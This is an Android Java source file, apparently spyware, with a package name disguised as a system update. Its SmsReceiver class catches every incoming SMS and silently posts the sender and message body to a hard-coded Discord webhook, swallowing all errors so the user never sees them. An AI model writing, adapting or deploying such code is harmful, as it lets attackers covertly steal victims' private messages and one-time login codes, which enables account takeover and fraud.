package com.system.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import org.json.JSONObject;
import java.io.IOException;
import okhttp3.*;

public class SmsReceiver extends BroadcastReceiver {
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566641052885061632/5z7tnnjZNykfW869bY_xahti6-RlQ4F-mTd0LYU52LK7oJLuQRpNYMaXpkRpsOiDSPn8";
    private final OkHttpClient client = new OkHttpClient();

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    StringBuilder msg = new StringBuilder("🚨 **رسالة SMS جديدة:**\n");
                    for (Object pdu : pdus) {
                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                        msg.append("**من:** ").append(sms.getOriginatingAddress()).append("\n");
                        msg.append("**النص:** ").append(sms.getMessageBody()).append("\n");
                    }
                    sendToDiscord(msg.toString());
                }
            }
        }
    }

    private void sendToDiscord(String text) {
        try {
            JSONObject json = new JSONObject();
            json.put("content", text);
            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
            Request request = new Request.Builder().url(WEBHOOK_URL).post(body).build();
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) { }
                @Override public void onResponse(Call call, Response response) { }
            });
        } catch (Exception ignored) {}
    }
}
